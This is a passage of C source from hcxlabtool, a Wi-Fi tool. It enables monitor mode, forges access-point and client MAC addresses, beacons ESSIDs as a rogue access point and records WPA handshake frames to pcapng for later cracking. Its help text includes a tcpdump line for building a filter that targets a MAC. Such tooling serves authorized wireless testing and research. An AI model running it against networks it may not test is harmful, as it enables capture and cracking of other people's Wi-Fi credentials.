			if(ioctl(fd_socketinfo, SIOCGIWNAME, &iwrinfo) != -1)
				{
				memcpy(&ifname, ifa->ifa_name, IFNAMSIZ);
				if(fd_socketinfo > 0) close(fd_socketinfo);
				freeifaddrs(ifaddr);
				return;
				}
			if(fd_socketinfo > 0) close(fd_socketinfo);
			}
		}
	}
freeifaddrs(ifaddr);
return;
}
/*===========================================================================*/
static inline bool opensocket(char *interfacename)
{
static struct iwreq iwrinfo, iwr;
static struct ifreq ifr;
static struct sockaddr_ll ll;
static struct packet_mreq mr;
static struct ethtool_perm_addr *epmaddr;
static int enable = 1;
static int fdnum;
static fd_set readfds;
static struct timespec tsfd;
static struct timespec waitdevice;

memset(&ifname, 0, IFNAMSIZ +1);
memset(&ifmac, 0, sizeof(ifmac));
if(interfacename != NULL) strncpy(ifname, interfacename, IFNAMSIZ);
else
	{
	getfirstinterfacename();
	if(ifname[0] == 0)
		{
		waitdevice.tv_sec = 5;
		waitdevice.tv_nsec = 0;
		nanosleep(&waitdevice, NULL);
		getfirstinterfacename();
		}
	}
if(ifname[0] == 0)
	{
	fprintf(stderr, "failed to detect interface\n");
	return false;
	}
if((fd_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) return false;

memset(&iwrinfo, 0, sizeof(iwr));
memcpy(&iwrinfo.ifr_name, ifname, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIWNAME, &iwrinfo) == -1) return false;

if(bpf.len > 0) if(setsockopt(fd_socket, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf)) < 0) return false;

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0) return false;
memset(&ll, 0, sizeof(ll));
ll.sll_family = PF_PACKET;
ll.sll_ifindex = ifr.ifr_ifindex;
ll.sll_protocol = htons(ETH_P_ALL);
ll.sll_halen = ETH_ALEN;
ll.sll_pkttype = PACKET_OTHERHOST;
if(bind(fd_socket, (struct sockaddr*) &ll, sizeof(ll)) < 0) return false;

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
ifr.ifr_flags = 0;
if(ioctl(fd_socket, SIOCGIFINDEX, &ifr) < 0) return false;
memset(&mr, 0, sizeof(mr));
mr.mr_ifindex = ifr.ifr_ifindex;
mr.mr_type = PACKET_MR_PROMISC;
if(setsockopt(fd_socket, SOL_PACKET, PACKET_ADD_MEMBERSHIP, &mr, sizeof(mr)) < 0) return false;

if(setsockopt(fd_socket, SOL_PACKET, PACKET_IGNORE_OUTGOING, &enable, sizeof(int)) < 0) perror("ioctl(PACKET_IGNORE_OUTGOING) not supported by driver");

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) return false; /* set interface down */


memset(&iwr, 0, sizeof(iwr));
iwr.u.mode = IW_MODE_MONITOR;
memcpy(&iwr.ifr_name, ifname, IFNAMSIZ);
if(ioctl(fd_socket, SIOCSIWMODE, &iwr) < 0) return false;

memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
ifr.ifr_flags = IFF_UP | IFF_BROADCAST | IFF_RUNNING;
if(ioctl(fd_socket, SIOCSIFFLAGS, &ifr) < 0) return false;

epmaddr = (struct ethtool_perm_addr*)calloc(1, sizeof(struct ethtool_perm_addr) +6);
if(!epmaddr) return false;
memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
epmaddr->cmd = ETHTOOL_GPERMADDR;
epmaddr->size = 6;
ifr.ifr_data = (char*)epmaddr;
if(ioctl(fd_socket, SIOCETHTOOL, &ifr) < 0) return false;
if(epmaddr->size != 6) return false;
memcpy(&ifmac, epmaddr->data, 6);
free(epmaddr);

memset(&ifvirtmac, 0, sizeof(ifvirtmac));
memset(&ifr, 0, sizeof(ifr));
memcpy(&ifr.ifr_name, ifname, IFNAMSIZ);
if(ioctl(fd_socket, SIOCGIFHWADDR, &ifr) >= 0) memcpy(&ifvirtmac, ifr.ifr_hwaddr.sa_data, 6);

memset(&iwr, 0, sizeof(iwr));
memcpy(&iwr.ifr_name, ifname, IFNAMSIZ);
iwr.u.freq.flags = IW_FREQ_FIXED;
iwr.u.freq.m = 2462;
iwr.u.freq.e = 6;
if(ioctl(fd_socket, SIOCSIWFREQ, &iwr) < 0) return false;

memset(&iwr, 0, sizeof(iwr));
memcpy(&iwr.ifr_name, ifname, IFNAMSIZ);
iwr.u.freq.flags = IW_FREQ_FIXED;
iwr.u.freq.m = 2412;
iwr.u.freq.e = 6;
if(ioctl(fd_socket, SIOCSIWFREQ, &iwr) < 0) return false;

FD_ZERO(&readfds);
FD_SET(fd_socket, &readfds);
tsfd.tv_sec = fdrxsectimer;
tsfd.tv_nsec = fdrxnsectimer;
fdnum = pselect(fd_socket +1, &readfds, NULL, NULL, &tsfd, NULL);
if(fdnum < 0) return true;
if(FD_ISSET(fd_socket, &readfds)) read(fd_socket, epb +EPB_SIZE, PCAPNG_MAXSNAPLEN);
return true;
}
/*===========================================================================*/
static inline void readbpfc(char *bpfname)
{
static int len;
static uint16_t c;
static struct sock_filter *zeiger;
static FILE *fh_filter;
static char linein[128];

if((fh_filter = fopen(bpfname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open Berkeley Packet Filter list %s\n", bpfname);
	return;
	}
if((len = fgetline(fh_filter, 128, linein)) == -1)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
sscanf(linein, "%"SCNu16, &bpf.len);
if(bpf.len == 0)
	{
	fclose(fh_filter);
	fprintf(stderr, "failed to read Berkeley Packet Filter array size\n");
	return;
	}
bpf.filter = (struct sock_filter*)calloc(bpf.len, sizeof(struct sock_filter));
c = 0;
zeiger = bpf.filter;
while(c < bpf.len)
	{
	if((len = fgetline(fh_filter, 128, linein)) == -1)
		{
		bpf.len = 0;
		break;
		}
	sscanf(linein, "%" SCNu16 "%" SCNu8 "%" SCNu8 "%" SCNu32, &zeiger->code, &zeiger->jt, &zeiger->jf, &zeiger->k);
	zeiger++;
	c++;
	}
if(bpf.len != c) fprintf(stderr, "failed to read Berkeley Packet Filter\n");
fclose(fh_filter);
return;
}
/*===========================================================================*/
static inline bool initgpio(unsigned int gpioperi)
{
static int fd_mem;

fd_mem = open("/dev/mem", O_RDWR|O_SYNC);
if(fd_mem < 0)
	{
	fprintf(stderr, "failed to get device memory\n");
	return false;
	}
gpio_map = mmap(NULL, BLOCK_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd_mem, gpioperi);
close(fd_mem);
if(gpio_map == MAP_FAILED)
	{
	fprintf(stderr, "failed to map GPIO memory\n");
	return false;
	}
gpio = (volatile unsigned *)gpio_map;
return true;
}
/*===========================================================================*/
static inline unsigned int getgpiobasemem()
{
static FILE *cpuinfo;
static FILE *iomem;
static int len;
static bool rpi = false;
static unsigned int gpioperibase = 0;
static char linein[RASPBERRY_INFO];

cpuinfo = fopen("/proc/cpuinfo", "r");
if(cpuinfo == NULL)
	{
	perror("failed to retrieve cpuinfo");
	return gpioperibase;
	}
while(1)
	{
	if((len = fgetline(cpuinfo, RASPBERRY_INFO, linein)) == -1) break;
	if(len < 18) continue;
	if(strstr(linein, "Raspberry Pi")) rpi = true;
	if(strstr(linein, "Serial") != NULL)
		{
		if(len > 8) rpisn = strtoul(&linein[len -4], NULL, 16);
		}
	}
fclose(cpuinfo);
if(rpi == false) return gpioperibase;
iomem = fopen("/proc/iomem", "r");
if(iomem == NULL)
	{
	perror("failed to retrieve iomem");
	return gpioperibase;
	}
while(1)
	{
	if((len = fgetline(iomem, RASPBERRY_INFO, linein)) == -1) break;
	if(strstr(linein, ".gpio") != NULL)
		{
		if(linein[8] != '-') break;
			{
			linein[8] = 0;
			gpioperibase = strtoul(linein, NULL, 16);
			break;
			}
		}
	}
fclose(iomem);
return gpioperibase;
}
/*===========================================================================*/
static inline bool openpcapng()
{
static char timestring[16];
static char filename[PATH_MAX];

strftime(timestring, PATH_MAX, "%Y%m%d%H%M%S", localtime(&tv.tv_sec));
snprintf(filename, PATH_MAX, "%s-%s", timestring, ifname);
fd_pcapng = hcxcreatepcapngdump(filename, ifmac, ifname, macrgap, rgrc, anonce, macrgclient, snonce, weakcandidatelen, weakcandidate);
if(fd_pcapng == -1) return false;
return true;
}
/*===========================================================================*/
static inline void readessidlist(char *listname)
{
static int len;
static int p;
static FILE *fh_essidlist;
static char linein[ESSID_LEN_MAX];
static uint64_t timestampcount = 0xFFFFFFFFFFFFFFFFULL;

if((fh_essidlist = fopen(listname, "r")) == NULL)
	{
	fprintf(stderr, "failed to open beacon list %s\n", listname);
	return;
	}
for(p = 0; p < rgbssidlistmax; p++)
	{
	if((len = fgetline(fh_essidlist, ESSID_LEN_MAX, linein)) == -1) break;
	if((len == 0) || (len > 32)) continue;
	(rgbssidlist +p)->timestamp = timestampcount;
	(rgbssidlist +p)->essidlen = len;
	memcpy((rgbssidlist +p)->essid, linein, len);
	(rgbssidlist +p)->mac[5] = nicrgap & 0xff;
	(rgbssidlist +p)->mac[4] = (nicrgap >> 8) & 0xff;
	(rgbssidlist +p)->mac[3] = (nicrgap >> 16) & 0xff;
	(rgbssidlist +p)->mac[2] = ouirgap & 0xff;
	(rgbssidlist +p)->mac[1] = (ouirgap >> 8) & 0xff;
	(rgbssidlist +p)->mac[0] = (ouirgap >> 16) & 0xff;
	nicrgap += 1;
	timestampcount--;
	}
fclose(fh_essidlist);
return;
}
/*===========================================================================*/
static inline bool globalinit()
{
static int c;
static int p;
static unsigned int seed;
static unsigned int gpiobasemem = 0;

gettimeofday(&tv, NULL);
timestamp = ((uint64_t)tv.tv_sec *1000000L) +tv.tv_usec;
tfctimestamp = timestamp;
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tvoldled.tv_sec = tv.tv_sec;
tvoldled.tv_usec = tv.tv_usec;
tvlast.tv_sec = tv.tv_sec;
tvlast.tv_sec = tv.tv_sec;
if((gpiobutton > 0) || (gpiostatusled > 0))
	{
	if(gpiobutton == gpiostatusled)
		{
		fprintf(stderr, "same value for wpi_button and wpi_statusled is not allowed\n");
		return false;
		}
	gpiobasemem = getgpiobasemem();
	if(gpiobasemem == 0)
		{
		fprintf(stderr, "failed to locate GPIO\n");
		return false;
		}
	if(initgpio(gpiobasemem) == false)
		{
		fprintf(stderr, "failed to init GPIO\n");
		return false;
		}
	if(gpiostatusled > 0)
		{
		INP_GPIO(gpiostatusled);
		OUT_GPIO(gpiostatusled);
		}
	if(gpiobutton > 0)
		{
		INP_GPIO(gpiobutton);
		}
	}
seed = rpisn +tv.tv_sec;
srand(seed);
mytime = 1;
errorcount = 0;
deauthenticationsequence = 1;
clientsequence = 1;
apsequence = 1;
beaconsequence = 1;

memset(&bpf, 0, sizeof(bpf));
memset(&ifname, 0, sizeof(ifname));
memset(&ifmac, 0, sizeof(ifmac));

ouirgap = (myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))]) &0xfcffff;
nicrgap = (rand() & 0x0fffff);
macrgbwcopen[5] = nicrgap & 0xff;
macrgbwcopen[4] = (nicrgap >> 8) & 0xff;
macrgbwcopen[3] = (nicrgap >> 16) & 0xff;
macrgbwcopen[2] = ouirgap & 0xff;
macrgbwcopen[1] = (ouirgap >> 8) & 0xff;
macrgbwcopen[0] = (ouirgap >> 16) & 0xff;
nicrgap += 1;
macrgap[5] = nicrgap & 0xff;
macrgap[4] = (nicrgap >> 8) & 0xff;
macrgap[3] = (nicrgap >> 16) & 0xff;
macrgap[2] = ouirgap & 0xff;
macrgap[1] = (ouirgap >> 8) & 0xff;
macrgap[0] = (ouirgap >> 16) & 0xff;

ouirgclient = (myvendorclient[rand() %((MYVENDORCLIENT_SIZE /sizeof(int)))]) &0xffffff;
nicrgclient = rand() & 0xffffff;
macrgclient[5] = nicrgclient & 0xff;
macrgclient[4] = (nicrgclient >> 8) & 0xff;
macrgclient[3] = (nicrgclient >> 16) & 0xff;
macrgclient[2] = ouirgclient & 0xff;
macrgclient[1] = (ouirgclient >> 8) & 0xff;
macrgclient[0] = (ouirgclient >> 16) & 0xff;

memset(&mac_pending, 0, 6);

for(c = 0; c < 32; c++)
	{
	anonce[c] = rand() %0xff;
	snonce[c] = rand() %0xff;
	}
rgrc = (rand()%0xfff) +0xf000;

if((bssidlist = (bssidlist_t*)calloc(BSSIDLIST_MAX +1, BSSIDLIST_SIZE)) == NULL) return false;
for(p = 0; p < BSSIDLIST_MAX +1; p++)
	{
	if(((bssidlist +p)->bssidinfo = (bssidinfo_t*)calloc(1, BSSIDINFO_SIZE)) == NULL)
		{
		fprintf(stdout, "failed to allocate memory for internal list\n");
		return false;
		}
	}

rgbssidlistp = 0;
rgbssidlistprp = 0;
if((rgbssidlist = (rgbssidlist_t*)calloc(RGBSSIDLIST_MAX +1, RGBSSIDLIST_SIZE)) == NULL) return false;
if((clientlist = (clientlist_t*)calloc(CLIENTLIST_MAX +1, CLIENTLIST_SIZE)) == NULL) return false;

wantstopflag = false;
signal(SIGINT, programmende);
return true;
}
/*===========================================================================*/
static inline void get_vif(char *vifname)
{
size_t l;
static int ecv;
static DIR *dirvif;
struct dirent *entryvif;

static char ieee802dirvif[PATH_MAX +1];

snprintf(ieee802dirvif, PATH_MAX, "/sys/class/ieee80211/%s/device/net/", vifname);
dirvif = opendir(ieee802dirvif);
if(dirvif == NULL)
	{
	perror("failed to open /sys/class/ieee80211");
	return;
	};
ecv = 0;
if(dirvif != NULL)
	{
	while((entryvif = readdir(dirvif)))
		{
		if(ecv > 1)
			{
			l = strlen(entryvif->d_name);
			if((l >0) && (l < NAME_MAX))
				{
				fprintf(stdout, " %s\n", entryvif->d_name);
				}
			}
		ecv++;
		}
	}
closedir(dirvif);
return;
}
/*===========================================================================*/
static inline bool show_wlaninterfaces()
{
size_t l;
static int ecp;
static DIR *dirphy;
struct dirent *entryphy;

static const char *ieee802dirphy = "/sys/class/ieee80211";

dirphy = opendir(ieee802dirphy);
if(dirphy == NULL)
	{
	perror("failed to open /sys/class/ieee80211");
	return false;
	};
ecp = 0;
while((entryphy = readdir(dirphy)))
	{
	if(ecp > 1)
		{
		l = strlen(entryphy->d_name);
		if((l > 0) && (l < NAME_MAX))
			{
			fprintf(stdout, "%s\n", entryphy->d_name);
			get_vif(entryphy->d_name);
			fprintf(stdout, "\n");
			}
		}
	ecp++;
	}
closedir(dirphy);
return true;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
fprintf(stdout, "%s %s (C) %s ZeroBeat\n", eigenname, VERSIONTAG, VERSIONYEAR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
fprintf(stdout, "%s %s (C) %s ZeroBeat\n"
	"usage: %s <options>\n"
	"\n"
	"short options:\n"
	"-i <interface> : interface (monitor mode will be enabled by hcxlabtool)\n"
	"                 default: first discovered interface\n"
	"-c <digit>     : set scan channel (1,2,3, ...) or frequency (2437,2462,5600,...)\n"
	"                 0 - 1000 treated as channel\n"
	"                   > 1000 treated as frequency in MHz\n"
	"                 channel numbers are not longer unique\n"
	"                 on 5GHz and 6Ghz it is recommended to use frequency instead of channel number\n"
	"                 https://en.wikipedia.org/wiki/List_of_WLAN_channels\n"
	"-b <bitmask>   : set scan band (override -c sitch)\n"
	"                 default: all bands supported by interface\n"
	"                 bitmask:\n"
	"                 1: 2.4GHz band (all channels supported by interface)\n"
	"                 2: 5GHz band (all channels supported by interface)\n"
	"                 4: 6GHz band (all channels supported by interface)\n"
	"-C             : show supported channels and quit\n"
	"                 if no channels are available, interface is probably in use or doesn't support monitor mode\n"
	"                 if more channels are available, firmware, driver and regulatory domain is probably patched\n"
	"-t <seconds>   : stay time on channel before hopping to the next channel\n"
	"                 default: dynamic channel management\n" 
	"-m <interface> : set monitor mode by ioctl() system call and quit\n"
	"-I             : show WLAN interfaces and quit\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n"
	"long options:\n"
	"--gpio_button=<digit>     : Raspberry Pi GPIO pin number of button (2...27)\n"
	"                            push GIPO butto to power off system\n"
	"                            default: GPIO not in use\n"
	"--gpio_statusled=<digit>  : Raspberry Pi GPIO number of status LED (2...27)\n"
	"                            default: GPIO not in use\n"
	"--onsigterm               : action when the program has been terminated (exit, poweroff, reboot)\n"
	"                             exit:     just terminate (default)\n"
	"                             poweroff: power off system\n"
	"                             reboot:   reboot system\n"
	"--ongpiobutton            : action when the program has been terminated (exit, poweroff, reboot)\n"
	"                             exit:     just terminate (default)\n"
	"                             poweroff: power off system\n"
	"                             reboot:   reboot system\n"
	"--ongtot                  : action when the program has been terminated (exit, poweroff, reboot)\n"
	"                             exit:     just terminate (default)\n"
	"                             poweroff: power off system\n"
	"                             reboot:   reboot system\n"
	"--onerror                 : action when the program has been terminated (exit, poweroff, reboot)\n"
	"                             exit:     just terminate (default)\n"
	"                             poweroff: power off system\n"
	"                             reboot:   reboot system\n"
	"--tot=<digit>             : enable timeout timer in minutes (minimum = 2 minutes)\n"
	"                            set TOT to reboot system\n"
	"--bpfc=<file>             : input kernel space Berkeley Packet Filter (BPF) code\n"
	"                            affected: incoming and outgoing traffic - that include rca scan\n"
	"                            steps to create a BPF (it only has to be done once):\n"
	"                            set monitormode\n"
	"                             $ %s -m <interface>\n"
	"                            create BPF to protect a MAC\n"
	"                             $ tcpdump -i <interface> not wlan addr1 11:22:33:44:55:66 and not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n"
	"                             recommended to protect own devices\n"
	"                            or create BPF to attack a MAC\n"
	"                             $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 -ddd > attack.bpf\n"
	"                             not recommended, because important pre-authentication frames will get lost due to MAC randomization of the CLIENTs\n"
	"                            use the BPF code\n"
	"                            notice: this is a protect/attack, a capture and a display filter\n"
	"                            see man pcap-filter for a list of all filter options\n"
	"--essidlist=<file>        : use ESSID from this list first\n"
	"--essidmax=<digit>        : BEACON first n ESSIDs\n"
	"                            this include the ESSIDs from essid list\n"
	"                            default: %d entries\n"
	"--m2attempt=<digit>       : reject CLIENT request after n received M2 frames\n"
	"                            default: %d received M2 frames\n"
	"--beaconinterval=<digit>  : default: %ld nanoseconds\n"
	"--weakcandidate=<password>: use this pre shared key (8...63 characters) as weak candidate\n"
	"                            will be stored to pcapng to inform hcxpcapngtool\n"
	"                            default: %s\n"
	"--help                    : show this help\n"
	"--version                 : show version\n",
	eigenname, VERSIONTAG, VERSIONYEAR, eigenname, eigenname, RGBSSIDLIST_MAX, M2ATTEMPTS, FDRXNSECTIMER, weakcandidate);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usageerror(char *eigenname)
{
fprintf(stdout, "%s %s (C) %s by ZeroBeat\n"
	"usage: %s -h for help\n", eigenname, VERSIONTAG, VERSIONYEAR, eigenname);
exit(EXIT_FAILURE);
}
/*===========================================================================*/
int main(int argc, char *argv[])
{
static int auswahl;
static int index;
static int totvalue;
static unsigned long long int bivalue;
static uint8_t scanband;
static char *interfacename;
static char *bpfcname;
static char *essidlistname;
static char *userscanlist;
static bool monitormodeflag;
static bool showinterfaceflag;
static bool showchannelflag;

static const char *exitstring = "exit";
static const char *poweroffstring = "poweroff";
static const char *rebootstring = "reboot";

static const char *weakcandidatedefault = "12345678";
static const char *short_options = "i:c:b:t:m:IChv";
static const struct option long_options[] =
{
	{"gpio_button",			required_argument,	NULL,	HCX_GPIO_BUTTON},
	{"gpio_statusled",		required_argument,	NULL,	HCX_GPIO_STATUSLED},
	{"bpfc",			required_argument,	NULL,	HCX_BPFC},
	{"essidlist",			required_argument,	NULL,	HCX_ESSIDLIST},
	{"m2attempt",			required_argument,	NULL,	HCX_M2ATTEMPT},
	{"essidmax",			required_argument,	NULL,	HCX_ESSIDMAX},
	{"beaconinterval",		required_argument,	NULL,	HCX_BEACON_INTERVAL},
	{"tot",				required_argument,	NULL,	HCX_TOT},
	{"weakcandidate	",		required_argument,	NULL,	HCX_WEAKCANDIDATE},
	{"onsigterm",			required_argument,	NULL,	HCX_ON_SIGTERM},
	{"ongpiobutton",		required_argument,	NULL,	HCX_ON_GPIOBUTTON},
	{"ontot",			required_argument,	NULL,	HCX_ON_TOT},
	{"onerror",			required_argument,	NULL,	HCX_ON_ERROR},
	{"version",			no_argument,		NULL,	HCX_VERSION},
	{"help",			no_argument,		NULL,	HCX_HELP},
	{NULL,				0,			NULL,	0}
};

auswahl = -1;
index = 0;
optind = 1;
optopt = 0;
rebootflag = false;
poweroffflag = false;
gpiobutton = 0;
gpiostatusled = 0;
onsigterm = WANT_EXIT;
ongpiobutton = WANT_EXIT;
ontot = WANT_EXIT;
onerror = WANT_EXIT;
interfacename = NULL;
essidlistname = NULL;
bpfcname = NULL;
userscanlist = NULL;
staytime = STAYTIME;
scanband = SCANBANDALL;
m2attempts = M2ATTEMPTS;
rgbssidlistmax = RGBSSIDLIST_MAX;
tvtot.tv_sec = 2147483647L;
tvtot.tv_usec = 0;
totvalue = 0;
fdrxsectimer = FDRXSECTIMER;
fdrxnsectimer = FDRXNSECTIMER;
weakcandidatelen = 8;
strncpy(weakcandidate, weakcandidatedefault, 64);
monitormodeflag = false;
showinterfaceflag = false;
showchannelflag = false;

while((auswahl = getopt_long(argc, argv, short_options, long_options, &index)) != -1)
	{
	switch (auswahl)
		{
		case HCX_INTERFACE_NAME:
		interfacename = optarg;
		if(strlen(interfacename) > IFNAMSIZ)
			{
			fprintf(stderr, "interfacename > IFNAMSIZE\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_CHANNEL:
		userscanlist = optarg;
		break;

		case HCX_SHOW_CHANNEL:
		showchannelflag = true;
		break;

		case HCX_SCANBAND:
		scanband = atoi(optarg);
		break;

		case HCX_STAYTIME:
		staytime = strtol(optarg, NULL, 10);
		if(staytime < 1)
			{
			fprintf(stderr, "stay time must be >= 1\n");
			exit (EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_BUTTON:
		gpiobutton = strtol(optarg, NULL, 10);
		if((gpiobutton < 2) || (gpiobutton > 27))
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		if(gpiostatusled == gpiobutton)
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_GPIO_STATUSLED:
		gpiostatusled = strtol(optarg, NULL, 10);
		if((gpiostatusled < 2) || (gpiostatusled > 27))
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		if(gpiostatusled == gpiobutton)
			{
			fprintf(stderr, "invalid GPIO option\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_ON_SIGTERM:
		if(strncmp(exitstring, optarg, 8) == 0) onsigterm = WANT_EXIT;
		else if(strncmp(poweroffstring, optarg, 8) == 0) onsigterm = WANT_POWEROFF;
		else if(strncmp(rebootstring, optarg, 8) == 0) onsigterm = WANT_REBOOT;
		else onsigterm = WANT_EXIT;
		break;

		case HCX_ON_GPIOBUTTON:
		if(strncmp(exitstring, optarg, 8) == 0) ongpiobutton = WANT_EXIT;
		else if(strncmp(poweroffstring, optarg, 8) == 0) ongpiobutton = WANT_POWEROFF;
		else if(strncmp(rebootstring, optarg, 8) == 0) ongpiobutton = WANT_REBOOT;
		else ongpiobutton = WANT_EXIT;
		break;

		case HCX_ON_TOT:
		if(strncmp(exitstring, optarg, 8) == 0) ontot = WANT_EXIT;
		else if(strncmp(poweroffstring, optarg, 8) == 0) ontot = WANT_POWEROFF;
		else if(strncmp(rebootstring, optarg, 8) == 0) ontot = WANT_REBOOT;
		else ontot = WANT_EXIT;
		break;

		case HCX_ON_ERROR:
		if(strncmp(exitstring, optarg, 8) == 0) onerror = WANT_EXIT;
		else if(strncmp(poweroffstring, optarg, 8) == 0) onerror = WANT_POWEROFF;
		else if(strncmp(rebootstring, optarg, 8) == 0) onerror = WANT_REBOOT;
		else onerror = WANT_EXIT;
		break;

		case HCX_BPFC:
		bpfcname = optarg;
		break;

		case HCX_ESSIDLIST:
		essidlistname = optarg;
		break;

		case HCX_ESSIDMAX:
		rgbssidlistmax = strtol(optarg, NULL, 10);
		if(rgbssidlistmax > RGBSSIDLIST_MAX)
			{
			fprintf(stderr, "too many ESSIDs to transmit\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_M2ATTEMPT:
		m2attempts = strtol(optarg, NULL, 10);
		if(m2attempts == 0)
			{
			fprintf(stderr, "value must be greater than 0\n");
			exit(EXIT_FAILURE);
			}
		break;

		case HCX_TOT:
		if(!isdigit(optarg[0]))
			{
			fprintf(stderr, "status must be a digit\n");
			exit(EXIT_FAILURE);
			}
		totvalue = strtol(optarg, NULL, 10);
		if(totvalue < 2)
			{
			fprintf(stderr, "tot must be >= 2 (minutes)\n");
			exit(EXIT_FAILURE);
			}
		gettimeofday(&tvtot, NULL);
		tvtot.tv_sec += totvalue *60;
		break;

		case HCX_BEACON_INTERVAL:
		bivalue = strtoll(optarg, NULL, 10);
		if(bivalue < 100)
			{
			fprintf(stderr, "interval must be >= 100 nanoseconds\n");
			exit(EXIT_FAILURE);
			}
		if(bivalue < 1000000000L) fdrxnsectimer = bivalue;
		else
			{
			fdrxnsectimer = bivalue %1000000000L;
			fdrxsectimer = bivalue /1000000000L;
			}
		break;

		case HCX_WEAKCANDIDATE:
		weakcandidatelen = strlen(optarg);
		if((weakcandidatelen < 8) || (weakcandidatelen > 63))
			{
			fprintf(stderr, "only length 8...63 characters allowed\n");
			exit(EXIT_FAILURE);
			}
		strncpy(weakcandidate, optarg, 64);
		break;

		case HCX_SET_MONITORMODE:
		interfacename = optarg;
		if(strlen(interfacename) > IFNAMSIZ)
			{
			fprintf(stderr, "interfacename > IFNAMSIZE\n");
			exit (EXIT_FAILURE);
			}
		monitormodeflag = true;
		break;

		case HCX_SHOW_INTERFACES:
		showinterfaceflag = true;
		break;

		case HCX_HELP:
		usage(basename(argv[0]));
		break;

		case HCX_VERSION:
		version(basename(argv[0]));
		break;

		case '?':
		usageerror(basename(argv[0]));
		break;
		}
	}
setbuf(stdout, NULL);
if(showinterfaceflag == true)
	{
	show_wlaninterfaces();
	return EXIT_SUCCESS;
	}
if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	exit(EXIT_FAILURE);
	}

if(monitormodeflag == true)
	{
	if(opensocket(interfacename) == true)
		{
		fprintf(stdout, "monitor mode activated\n");
		return EXIT_SUCCESS;
		}
	else
		{
		fprintf(stderr, "monitor mode failed\n");
		exit(EXIT_FAILURE);
		}
	}

if(globalinit() == false)
	{
	fprintf(stderr, "global init failed\n");
	exit(EXIT_FAILURE);
	}

if(bpfcname != NULL) readbpfc(bpfcname);
if((bpfcname != NULL) && (bpf.len == 0)) fprintf(stderr, "BPF code not loaded\n");

if(essidlistname != NULL) readessidlist(essidlistname);
if(opensocket(interfacename) == false)
	{
	standbyloop();
	globalclose();
	if(rebootflag == true)
		{
		if(system("reboot") != 0) fprintf(stderr, "can't reboot system\n");
		printf("reboot\n");
		exit(EXIT_SUCCESS);
		}
	if(poweroffflag == true)
		{
		if(system("poweroff") != 0) fprintf(stderr, "can't power off\n");
		exit(EXIT_FAILURE);
		}
	return EXIT_SUCCESS;
	}

if(openpcapng() == false)
	{
	fprintf(stderr, "open pcapng file failed\n");
	exit(EXIT_FAILURE);
	}

if(showchannelflag == true) show_channels();
else if(userscanlist == NULL)
	{
	getscanlist(scanband);
	if(ptrscanlist != scanlist)
		{
		if(staytime == 0) fdloopscantfc();
		else fdloopscan();
		}
	else fprintf(stderr, "interface doesn't support frequency scan\n");
	}
else
	{
	getchannel(userscanlist);
	if(ptrscanlist == scanlist +1) fdloop();
	else if(ptrscanlist > scanlist +1)
		{
		if(staytime == 0) fdloopscantfc();
		else fdloopscan();
		}
	else fprintf(stderr, "interface doesn't support selected frequencies/channels\n");
	}

globalclose();
if(errorcount > 0) fprintf(stdout, "\n%d error(s) encountered\n", errorcount);

if(rebootflag == true)
	{
	if(system("reboot") != 0) fprintf(stderr, "can't reboot system\n");
	printf("reboot\n");
	exit(EXIT_SUCCESS);
	}
if(poweroffflag == true)
	{
	if(system("poweroff") != 0) fprintf(stderr, "can't power off system\n");
	printf("poweroff\n");
	exit(EXIT_SUCCESS);
	}

return EXIT_SUCCESS;
}
/*===========================================================================*/
